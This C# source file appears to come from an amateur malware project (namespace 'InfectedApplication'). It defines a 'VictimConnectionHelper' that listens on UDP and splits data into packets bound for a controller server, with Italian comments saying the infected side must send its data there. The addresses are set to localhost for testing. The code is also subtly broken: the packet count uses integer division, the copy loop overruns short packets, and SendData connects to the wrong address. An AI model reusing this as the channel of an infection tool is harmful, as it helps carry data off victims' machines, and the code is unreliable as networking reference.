using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace InfectedApplication.Helper
{
    public class VictimConnectionHelper
    {
        //INFO: NOW JUST IN 127.0.0.1 FOR TESTING
        //INFORMAZIONI DEL CLIENT
        public const int VictimPort = 1236;
        public const string VictimIp = "127.0.0.1";
        private const int Buffer = 2048;
        
        //SERVER A CUI DEVE INVIARE I DATI
        public const int MrePort = 8080;
        public const string MreIp = "127.0.0.1";

        private UdpClient VictimServer;
        private UdpClient VictimClient;
        private Thread listen;
        private Victim vtm;

        public VictimConnectionHelper()
        {
            VictimServer = new UdpClient(VictimPort);
            VictimClient = new UdpClient();
            vtm = new Victim();
        }

        private void StartServer()
        {
            Console.WriteLine("Server vittima creato.");
            while (true)
            {
                var remoteEP = new IPEndPoint(IPAddress.Any, VictimPort);
                var data = VictimServer.Receive(ref remoteEP);
                byte[] recivedData = data.ToArray<byte>();
                vtm.richTextBox1.Text = data.ToString();
            }
        }

        public void StartAsyncListening()
        {
            listen = new Thread(StartServer);
            listen.Start();
        }

        public void StopAsyncListening()
        {
            listen.Abort();
        }

        public void SendData(byte[] data)
        {
            VictimClient.Connect(IPAddress.Parse(VictimIp), VictimPort);

            byte[][] packets = PreparePackets(data);
            SendAllPackets(packets);
        }



        private byte[][] PreparePackets(byte[] data)
        {
            float packetsFloat = data.Length / Buffer;
            int packetsNumber = 0;

            if (NumbersHelper.IsFloat(packetsFloat))
            {
                packetsNumber = (int)packetsFloat + 1;
            }
            else
            {
                packetsNumber = (int)packetsFloat;
            }
            Console.WriteLine("Packets needed: " + packetsNumber);
            byte[][] packets = new byte[packetsNumber][];

            if (data.Length < Buffer)
            {
                packets[0] = data;
                return packets;
            }
            else
            {
                int dataPos = 0;
                for (int i = 0; i < packets.Length; i++)
                {
                    int remaningBytes = data.Length - dataPos;
                    byte[] packet;
                    if (remaningBytes < Buffer)
                    {
                        packet = new byte[remaningBytes];
                    }
                    else
                    {
                        packet = new byte[Buffer];
                    }

                    //BUILD PACKET
                    for (int j = 0; j < Buffer; j++)
                    {
                        packet[j] = data[dataPos];
                        dataPos++;
                    }

                    packets[i] = packet;
                }

                return packets;
            }
        }

        private void SendAllPackets(byte[][] packets)
        {
            for (int i = 0; i < packets.Length; i++)
            {
                VictimClient.Send(packets[i], packets[i].Length);
            }
        }
    }
}
